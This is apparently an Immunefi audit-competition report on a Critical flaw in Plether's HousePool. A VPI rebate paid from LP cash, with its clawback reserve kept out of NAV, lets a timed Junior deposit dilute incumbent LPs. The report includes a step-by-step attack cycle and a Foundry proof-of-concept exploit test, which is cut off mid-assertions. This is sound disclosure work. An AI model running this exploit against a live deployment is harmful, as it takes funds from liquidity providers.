# \#98858 [SC-Critical] A skew-reducing open is paid its VPI rebate from LP cash while the reserve-backed clawback stays outside terminal NAV, so a timed Junior deposit enters below NAV and takes value from incumbent and same-epoch exiting Junior LPs

**Submitted on Nov 10th 2026 at 15:51:49 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98858
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-reducing open earns a negative price impact (VPI rebate) `R`. The pool pays `R` out of LP cash immediately. The trader must lock the same `R` in a dedicated VPI-rebate reserve, and the lifetime VPI clamp forces the position to pay `R` back to the pool when it closes. Terminal NAV, however, excludes that reserve. So between the open and the close, HousePool's reconcile books Junior principal down by `R`, and the next permissionless LP epoch settlement prices Junior deposits and redemptions at `principal - R`.

The attack is a short, repeatable cycle:
1. An actor who is both a trader and a pending Junior depositor opens skew-reducing seconds after the epoch boundary.
2. It settles the epoch itself, so its deposit activates at the depressed price.
3. It closes, and the clawback returns `R` to the pool as fresh LP revenue.

The deposit's extra shares then carry value taken from incumbent Junior LPs, and any honest Junior exit funded in the same settlement is underpaid. With release risk parameters and 3M USDG of third-party skew on a ~9M pool, the proof shows:
- the attacker ends the cycle +1,264 USDG, which is 1,347 USDG more than the same deposit without the trade, with its position open for 30 seconds;
- the remaining Junior LP loses 2,081 USDG and ends at 1,998,482 USDG, below its 2,000,000 USDG deposit (control: 2,000,564 USDG);
- an honest Junior exit in the same settlement is underpaid by 1,664 USDG: it receives 998,631 USDG for a 1,000,000 USDG deposit (control: 1,000,295 USDG).

## Vulnerability Details

### Intended behaviour

VPI charges skew-increasing trades and rebates skew-reducing ones. A position's lifetime VPI may never be net negative. The close clamps the fresh VPI so that `accrued + delta >= 0`, which recovers any rebate received at open ([`CloseAccountingLib.sol#L103-L118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)). Until the close, "the full gross negative lifetime-VPI clawback target `max(-vpiAccrued, 0)` remains protected in the dedicated VPI sub-reserve". The spec states that "the VPI reserve therefore does not inflate marked LP receivables or symmetric LP NAV" ([`ACCOUNTING_SPEC.md#L1057-L1066`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1057-L1066)), and the whitepaper gives the reason: "so LPs cannot withdraw it as marked equity before the matching position obligation settles" ([`WHITEPAPER.md#L885-L889`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L885-L889)). The exclusion applies to the symmetric NAV that prices both entries and exits ([`SECURITY.md#L849-L872`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L849-L872)). Its stated purpose is to give new LPs the discount for marked trader liabilities they inherit and to avoid phantom receivables. Neither applies here, because there is no liability. The pool has already paid `R` out of LP cash, the trader has re-locked the same `R` in a nonwithdrawable reserve, and the lifetime clamp forces it back at close or liquidation ([`SECURITY.md#L1436-L1437`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1436-L1437)). Excluding it prices every entry and exit during the position's life at a principal `R` below the pool's real value, and an untrusted actor can open that window at will.

### Root cause

1. **The rebate leaves LP cash at once.** The planner sets the pool payout to the negative trade cost (`R` minus the execution fee; `_settleProtocolFeeTopUp` then funds that fee to the treasury from pool cash, [`CfdEngineSettlementSidecar.sol#L905-L926`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L905-L926), so pool `totalAssets` falls by exactly `R`) ([`CfdEnginePlanLib.sol#L333`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333)):

```solidity
        delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

   The settlement sidecar pays it out of HousePool ([`CfdEngineSettlementSidecar.sol#L442-L444`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L444)):

```solidity
        if (delta.poolRebatePayoutAssets > 0) {
            IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
        }
```

2. **The same `R` is parked in the trader's own reserve, outside NAV.** The sidecar locks the reserve increase from the trader's free settlement or pledge ([`CfdEngineSettlementSidecar.sol#L466-L477`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L466-L477)). Terminal NAV models only each position's marked price PnL, so the VPI clawback is not a term of the curve ([`ACCOUNTING_SPEC.md#L1064-L1066`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1064-L1066)), and it counts only the PnL pledge and same-account claims as the position's receivable cap ([`TerminalNavBookV2.sol#L431-L434`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L431-L434)):

```solidity
        uint256 candidateCapAssetAtoms =
            clearinghouse.pnlPledgeAssets(account) + engine.traderClaimBalanceAssets(account);
```

   The reserve, which the close or a liquidation must return to the pool, is therefore invisible to LP pricing. The trader's free balance moves only by the fee: it is credited `R - fee` and must lock `R` in the same call.

3. **The close forces `R` back.** The lifetime clamp charges the closing position at least the accrued rebate (exactly `R` when the fresh close VPI is smaller, as in the proof) ([`CloseAccountingLib.sol#L113-L118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L113-L118)), and the reserve is consumed into the pool as revenue:

```solidity
        if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
            state.vpiDeltaAssets = -state.proportionalAccrualAssets;
        }
```

4. **LP epoch settlement prices entries and exits at the depressed principal.** `HousePool._settleLpEpoch` reconciles first, booking the `R` cash drop junior-first, then prices the epoch at the resulting `juniorPrincipal`:
   - Junior redemptions are funded at it ([`HousePool.sol#L835-L841`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841)).
   - Junior deposits are activated at it ([`HousePool.sol#L914-L919`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L919)).

```solidity
        juniorDepositPhase.pricingAssets = juniorPrincipal;
        juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

   Settlement is permissionless through [`OrderRouter.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484) with caller-supplied Pyth data, so the attacker can run it right after its own open. It need not win that race. If it opens shortly before the boundary instead, Junior principal stays depressed until its close, so the first settlement of the epoch prices the deposit at it, whoever sends that settlement. This lengthens the price exposure from seconds to minutes.

The attacker controls every step:
- the deposit request (ordinary, for the next epoch);
- the open seconds after the boundary, executed by itself as a permissionless keeper;
- the settlement;
- the close, seconds later.

`R = 0.5·k·S0²/D` grows with existing third-party skew `S0`. The attacker's gain is `a·R - fees - carry`, where `a` is its share of Junior supply after the deposit, so it profits once `a·S0/D` exceeds about 0.16 at release parameters (`vpiFactor` 1%, execution fee 4 bps, an attacker trade that brings the skew to zero), before the oracle's adverse-confidence shift. The proof's Pyth mock reports zero confidence. Live fills are shifted against the trader by 25% of basket confidence, which is capped at 10 bps, so at most 2.5 bps of notional per leg. At that cap the proof's cycle would cost roughly a further 940 USDG (about `(2 - a)·750`) and stay profitable at about +400 USDG (estimate, not measured). At ordinary FX confidence the cost is small.

### Why this is not a documented limitation or the symmetric-NAV trade-off

- The VPI Known Limitations ([`SECURITY.md#L1434-L1444`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1434-L1444)) cover the trader side: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". This attack respects the clamp, because the position's lifetime VPI is exactly zero. The loss is on the LP leg, which no listed limitation covers.
- The symmetric-NAV design discounts entrants for marked trader liabilities they inherit ([`SECURITY.md#L859-L860`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L859-L860); plether-core PR #62). PR #61 accepts that conservative accounting can temporarily understate Junior value. Both concern uncertain obligations. The rebate reserve is not one: it is the trader's own nonwithdrawable cash, equal to the clawback and consumed at close or liquidation. The NAV drop comes from paying out a rebate that the trader must immediately lock back, and an untrusted actor can create the drop and time a deposit against it.
- The loss is not limited to yield. The remaining Junior LP ends below its deposit, and the honest exit receives less than it deposited.

## Impact Details


Selected impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)**:
- incumbent Junior principal is transferred to the attacker's newly minted shares (funds at rest);
- the same-epoch honest Junior exit is paid short (funds in motion).

The fallback is "Theft of unclaimed yield" (High), if triage treats the transfer as a reallocation of booked revenue.

Measured in the proof at release risk parameters (pool: 2M incumbent Junior, 1M exiting Junior, 6M Senior; 3M USDG third-party LONG skew; the attacker deposits 6M Junior and opens a 3M SHORT):

| Quantity | Value |
| :-- | :-- |
| Rebate `R` paid from LP cash at open | 4,996 USDG (pool `totalAssets` drops 4,996) |
| Attacker VPI reserve after open | 4,996 USDG (returned to the pool at close) |
| Junior principal used to price the attacker's deposit | 1,998,260 USDG (attack) vs 2,001,592 USDG (control); the gap is 2/3 of `R` because the honest exit, funded first in the same settlement, took the other third |
| Attacker's net gain from the trader legs, per cycle | 1,347 USDG |
| Attacker position lifetime | 30 seconds |
| Incumbent Junior LP loss | 2,081 USDG; it ends at 1,998,482 USDG on a 2,000,000 USDG deposit (control: 2,000,564 USDG) |
| LP-side transfer to the attacker | 3,745 USDG (2,081 + 1,664); the attacker keeps 1,347 USDG after about 2,400 USDG of execution fees (4 bps on 3M per leg) paid to the treasury |

| Honest Junior exit funded in the same settlement | 998,631 USDG (attack) vs 1,000,295 USDG (control), underpaid by 1,664 USDG |

- **Repeatable.** The attacker can repeat the cycle once its previous deposit has been redeemed: about every three epochs with the proof's timing, because any Junior shares it still holds at an attack settlement are diluted along with the incumbents. It can do so for as long as third-party skew exists. The gain per cycle scales with `S0²/D` and with the attacker's Junior share, up to `R` minus fees. The proof runs one cycle.
- **Low risk.** The attacker's price exposure lasts seconds (minutes if it opens before the boundary), and no trusted role is involved.
- **Capital.** The capital is a Junior deposit, which is returned at the restored NAV after the one-hour cooldown. The program states that a high capital requirement is generally not a valid reason to downgrade. At the proof's skew, a deposit about the size of the remaining Junior tranche is already profitable.

## Mitigation

Count the outstanding, reserve-funded clawback `Σ max(-vpiAccrued, 0)` as an LP receivable in the NAV that prices deposit activation, so entries are not priced below the pool's real value. Exits can keep excluding it if the team prefers not to pay out value that is not yet cash; that asymmetry only favours incumbents.

Two alternatives:
- do not pay the rebate out of pool cash at open; credit it only when the position closes, net of the clamp;
- price deposit activation at `principal + Σ max(-vpiAccrued, 0)`.

## References

- [`CfdEnginePlanLib.sol#L333`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333): pool rebate payout equals the negative trade cost.
- [`CfdEngineSettlementSidecar.sol#L442-L444`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L444) and [`#L466-L477`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L466-L477): payout from HousePool and the trader's reserve lock.
- [`CloseAccountingLib.sol#L103-L118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118): lifetime clamp recovers `R` at close.
- [`TerminalNavBookV2.sol#L431-L434`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L431-L434): terminal receivable cap counts pledge and claims, not the VPI reserve.
- [`HousePool.sol#L835-L841`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841) and [`#L914-L919`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L919): epoch redemptions and deposits priced at the reconciled `juniorPrincipal`.
- [`ACCOUNTING_SPEC.md#L1057-L1066`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1057-L1066) and [`WHITEPAPER.md#L885-L889`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L885-L889): the reserve is deliberately kept out of NAV, framed as exit protection only.
- Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).


## Proof of Concept

## Proof of Concept

Setup. The proof is a Foundry test in the repository's own perps test suite at the pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).
- It extends `BasePerpTest` with the release risk parameters.
- Every attack step goes through a public entrypoint: `TrancheVault.requestDeposit` / `claimDeposit` / `requestRedeem` / `claimRedeem`, and `OrderRouter.commitOrder` / `executeOrder` / `updateMarkPrice` / `settleLpEpoch` with caller-supplied Pyth data.
- During the attack, `vm.prank` only selects the sender.
- Before any position exists, suite helpers fund the pool and traders. The LP funding helper installs the initial 1.00 mark and settles the funding epochs through the router address, which is equivalent to the public `updateMarkPrice` / `settleLpEpoch`. The helpers also set the release 8000 bps Senior share cap through the owner's timelocked propose/finalize (the absolute cap is left unbounded; the release 40M cap does not bind at 6M Senior), and they drive the out-of-scope Pyth mock, which reports zero confidence. Only USDG and Pyth are mocked, and no in-scope contract is modified.
- The same timeline runs twice from one EVM snapshot: once with the attacker's trader legs and once without. The difference is the value moved.

Place the file at `packages/perps/test/poc/hunt-nav/ProofNegativeVpiRebateDepositDilution.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/poc/hunt-nav forge test --match-path 'test/poc/hunt-nav/*.t.sol' -vv
```

`FOUNDRY_TEST` limits the via-IR compile to the sources plus the proof directory. On a machine that can compile the whole test tree, the plain `forge test --match-path ...` works too.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IAsyncTrancheVault} from "@plether/perps/interfaces/IAsyncTrancheVault.sol";

/**
 * Proof: a skew-reducing open is paid its negative price impact R out of LP cash at once, so terminal NAV
 * (and Junior principal at the next reconcile) drops by R, although R is parked in the trader's dedicated
 * VPI-rebate reserve and the lifetime clamp forces the same position to pay R back to the pool at close.
 * An address that is a pending Junior depositor and a trader opens skew-reducing just before its deposit
 * epoch settles, so its deposit is priced at the depressed principal; it then closes, the clawback R is
 * booked as new LP revenue, and the depositor holds the extra shares that dilute the incumbent Junior LPs.
 *
 * Every attack step goes through a public entrypoint (TrancheVault.requestDeposit / claimDeposit /
 * requestRedeem / claimRedeem, OrderRouter.commitOrder / executeOrder / updateMarkPrice / settleLpEpoch with
 * caller-supplied Pyth data). vm.prank only selects the sender. Suite helpers fund the pre-attack pool and
 * traders and drive the out-of-scope Pyth mock. Release risk parameters from DEPLOYMENT.md.
 *
 * The same timeline is run twice from one EVM snapshot: (1) attack: deposit + skew-reducing open/close
 * around the deposit's settlement; (2) control: the identical deposit and redemption without the trader
 * legs. The difference is the value moved from incumbent Junior LPs to the attacker.
 */
contract ProofNegativeVpiRebateDepositDilution is BasePerpTest {
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant INCUMBENT_JUNIOR = address(0x1C1000);
    address internal constant INCUMBENT_SENIOR = address(0x5E0001);
    address internal constant SKEW_TRADER = address(0x5E30000);
    address internal constant EXITING_JUNIOR = address(0xE1171);

    uint256 internal constant INCUMBENT_JUNIOR_ASSETS = 2_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 6_000_000e6;
    uint256 internal constant EXITING_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 6_000_000e6;
    uint256 internal constant PRICE = 1e8; // 1.00

    uint256 internal constant SKEW_SIZE = 3e24; // 30,000 lots = 3M USDG notional (third-party LONG skew)
    uint256 internal constant ATTACKER_SIZE = 3e24; // attacker SHORT of the same size: skew 3M -> 0
    uint256 internal constant ATTACKER_TRADER_FUNDING = 60_000e6;
    uint256 internal constant ATTACKER_ORDER_MARGIN = 15_000e6;

    struct RunResult {
        uint256 wealthStart;
        uint256 wealthEnd;
        uint256 depositShares;
        uint256 redeemedAssets;
        uint256 incumbentJuniorValueEnd;
        uint256 juniorPrincipalAtDepositPricing;
        uint256 rebateR;
        uint256 poolDropAtOpen;
        uint256 poolRiseAtClose;
        uint256 reserveAfterOpen;
        uint256 reserveAfterClose;
        uint256 openTime;
        uint256 positionSeconds;
        uint256 exitingJuniorProceeds;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ------------------------------------------------------------------
    // Public-entrypoint helpers
    // ------------------------------------------------------------------

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 now_ = vm.getBlockTimestamp();
        uint256 target;
        if (isClose) {
            target = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        } else {
            target = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        }
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, now_, vm.getBlockNumber())),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(now_) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev `account` commits, then executes its own order as a permissionless keeper.
    function _commitAndExecute(
        address account,
        OrderV3Types.OrderRequest memory request
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythData = _mockPythUpdateData(PRICE);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, pythData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _refreshMarkVia(
        address account
    ) internal {
        bytes[] memory pythData = _mockPythUpdateData(PRICE);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        router.updateMarkPrice{value: fee}(pythData);
    }

    function _settleLpEpochVia(
        address account
    ) internal {
        bytes[] memory pythData = _mockPythUpdateData(PRICE);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        router.settleLpEpoch{value: fee}(pythData);
    }

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

    function _juniorValue(
        address holder
    ) internal view returns (uint256) {
        return (juniorVault.balanceOf(holder) * (pool.juniorPrincipal() + 1)) / (juniorVault.totalSupply() + 1000);
    }

    // ------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------

    function _run(
        bool attack,
        uint256 epochE
    ) internal returns (RunResult memory r) {
        uint256 t0 = pool.lpEpochStart(epochE) + 120;
        vm.warp(t0);
        _refreshMarkVia(SKEW_TRADER);

        // Third-party skew: LONG 3M on a ~9M pool (skew ratio ~0.33 <= 0.4).
        vm.warp(t0 + 60);
        _commitAndExecute(SKEW_TRADER, _request(CfdTypes.Side.LONG, SKEW_SIZE, 20_000e6, false));

        // Attacker queues a Junior deposit for epoch E+1 (ordinary request, before the 5-minute cutoff).
        vm.warp(t0 + 120);
        _refreshMarkVia(ATTACKER);
        r.wealthStart = _wealth(ATTACKER);
        // An honest Junior LP queues an ordinary exit for the same epoch E+1.
        uint256 exitShares = juniorVault.balanceOf(EXITING_JUNIOR);
        vm.prank(EXITING_JUNIOR);
        uint256 exitId = IAsyncTrancheVault(address(juniorVault)).requestRedeem(exitShares, EXITING_JUNIOR, EXITING_JUNIOR);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_DEPOSIT);
        uint256 depositId = juniorVault.requestDeposit(ATTACKER_DEPOSIT, ATTACKER, ATTACKER);
        vm.stopPrank();
        assertEq(depositId, epochE + 1, "deposit matures for the next epoch");

        // Epoch E+1 starts; the deposit is now matured but unsettled.
        uint256 t1 = pool.lpEpochStart(epochE + 1) + 30;
        if (attack) {
            // Seconds after the boundary the attacker opens a skew-reducing SHORT and executes it itself: the
            // negative VPI R is paid out of LP cash at once and locked in the attacker's own VPI-rebate reserve
            // (CfdEngineSettlementSidecar.executeOpen). Its price exposure starts here.
            vm.warp(t1);
            uint256 poolBefore = pool.totalAssets();
            _commitAndExecute(ATTACKER, _request(CfdTypes.Side.SHORT, ATTACKER_SIZE, ATTACKER_ORDER_MARGIN, false));
            (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
            assertLt(vpiAccrued, 0, "skew-reducing open must earn a negative VPI rebate");
            r.rebateR = uint256(-vpiAccrued);
            r.poolDropAtOpen = poolBefore - pool.totalAssets();
            r.reserveAfterOpen = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            r.openTime = vm.getBlockTimestamp();
        }

        // Next epoch: the attacker settles through the permissionless Router path. Reconcile first books the
        // pool's drop into Junior principal, then the deposit phase prices the attacker's request at it.
        vm.warp(t1 + 15);
        _settleLpEpochVia(ATTACKER);
        r.juniorPrincipalAtDepositPricing = pool.juniorPrincipal() - ATTACKER_DEPOSIT;
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATTACKER);
        assertEq(claimable, ATTACKER_DEPOSIT, "deposit must activate in E+1");
        vm.prank(ATTACKER);
        r.depositShares = juniorVault.claimDeposit(depositId, claimable, ATTACKER, ATTACKER);
        uint256 exitFunded = IAsyncTrancheVault(address(juniorVault)).claimableRedeemRequest(exitId, EXITING_JUNIOR);
        assertEq(exitFunded, exitShares, "honest exit fully funded in E+1");
        vm.prank(EXITING_JUNIOR);
        r.exitingJuniorProceeds =
            IAsyncTrancheVault(address(juniorVault)).claimRedeem(exitId, exitFunded, EXITING_JUNIOR, EXITING_JUNIOR);

        if (attack) {
            // Close: skew 0 -> 3M at the deeper post-deposit pool. The fresh VPI is below R, so the lifetime
            // clamp charges exactly R and the reserve is consumed into the pool as new LP revenue.
            vm.warp(t1 + 30);
            uint256 poolBefore = pool.totalAssets();
            _commitAndExecute(ATTACKER, _request(CfdTypes.Side.SHORT, ATTACKER_SIZE, 0, true));
            r.positionSeconds = vm.getBlockTimestamp() - r.openTime;
            (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
            assertEq(sizeAfter, 0, "attacker position fully closed");
            r.poolRiseAtClose = pool.totalAssets() - poolBefore;
            r.reserveAfterClose = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        }

        // Exit after the 1h holder cooldown: request in E+2, funded in E+3.
        uint256 t2 = pool.lpEpochStart(epochE + 2) + 600;
        vm.warp(t2);
        _refreshMarkVia(ATTACKER);
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = IAsyncTrancheVault(address(juniorVault)).requestRedeem(shares, ATTACKER, ATTACKER);

        uint256 t3 = pool.lpEpochStart(epochE + 3) + 120;
        vm.warp(t3);
        _settleLpEpochVia(ATTACKER);
        uint256 funded = IAsyncTrancheVault(address(juniorVault)).claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(funded, shares, "attacker redemption fully funded");
        vm.prank(ATTACKER);
        r.redeemedAssets = IAsyncTrancheVault(address(juniorVault)).claimRedeem(redeemId, funded, ATTACKER, ATTACKER);

        r.wealthEnd = _wealth(ATTACKER);
        r.incumbentJuniorValueEnd = _juniorValue(INCUMBENT_JUNIOR);
    }

    function test_SkewReducingRebateDilutesIncumbentJunior() public {
        // Pre-attack state (suite helpers): 2M incumbent Junior, 1M Junior that exits, 6M Senior, release Senior cap.
        _fundJunior(INCUMBENT_JUNIOR, INCUMBENT_JUNIOR_ASSETS);
        _fundJunior(EXITING_JUNIOR, EXITING_JUNIOR_ASSETS);
        _fundSenior(INCUMBENT_SENIOR, SENIOR_ASSETS);
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        _fundTrader(SKEW_TRADER, 40_000e6);
        _fundTrader(ATTACKER, ATTACKER_TRADER_FUNDING);
        settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT);
        vm.deal(ATTACKER, 10 ether);
        vm.deal(SKEW_TRADER, 10 ether);

        uint256 epochE = vm.getBlockTimestamp() / 1 hours + 2;
        uint256 snap = vm.snapshotState();
        RunResult memory a = _run(true, epochE);
        vm.revertToState(snap);
        RunResult memory c = _run(false, epochE);

        // 1. The open pays R out of LP cash; the full R sits in the attacker's dedicated reserve.
        emit log_named_uint("rebate R (negative VPI at open), USDG", a.rebateR / 1e6);
        emit log_named_uint("pool totalAssets drop at open, USDG", a.poolDropAtOpen / 1e6);
        emit log_named_uint("attacker VPI reserve after open, USDG", a.reserveAfterOpen / 1e6);
        assertEq(a.reserveAfterOpen, a.rebateR, "full R is locked in the attacker's own reserve");
        assertGe(a.poolDropAtOpen, a.rebateR, "pool pays R (rebate net of fee plus fee top-up) at once");

        // 2. The deposit is priced at the principal depressed by R.
        emit log_named_uint("junior principal at deposit pricing (attack), USDG", a.juniorPrincipalAtDepositPricing / 1e6);
        emit log_named_uint("junior principal at deposit pricing (control), USDG", c.juniorPrincipalAtDepositPricing / 1e6);
        emit log_named_uint("deposit shares (attack)", a.depositShares);
        emit log_named_uint("deposit shares (control)", c.depositShares);
        assertGt(a.depositShares, c.depositShares, "depressed principal mints more shares for the same deposit");

        // 3. The close returns R to the pool from the reserve (lifetime clamp) as LP revenue.
        emit log_named_uint("pool totalAssets rise at close, USDG", a.poolRiseAtClose / 1e6);
        assertEq(a.reserveAfterClose, 0, "reserve consumed at close");
        assertGe(a.poolRiseAtClose, a.rebateR, "close pays R back (plus carry) to the pool");

        // 4. Net transfer: attacker profit vs the identical deposit without trader legs, paid by incumbent Junior LPs.
        int256 attackProfit = int256(a.wealthEnd) - int256(a.wealthStart);
        int256 controlProfit = int256(c.wealthEnd) - int256(c.wealthStart);
        int256 gain = attackProfit - controlProfit;
        emit log_named_int("attacker cycle P&L (attack), USDG", attackProfit / 1e6);
        emit log_named_int("attacker cycle P&L (control), USDG", controlProfit / 1e6);
        emit log_named_int("attacker gain from the trader legs, USDG", gain / 1e6);
        emit log_named_uint("incumbent junior value end (attack), USDG", a.incumbentJuniorValueEnd / 1e6);
        emit log_named_uint("incumbent junior value end (control), USDG", c.incumbentJuniorValueEnd / 1e6);
        uint256 incumbentLoss = c.incumbentJuniorValueEnd - a.incumbentJuniorValueEnd;
        emit log_named_uint("incumbent junior loss, USDG", incumbentLoss / 1e6);
        emit log_named_uint("attacker position lifetime, seconds", a.positionSeconds);
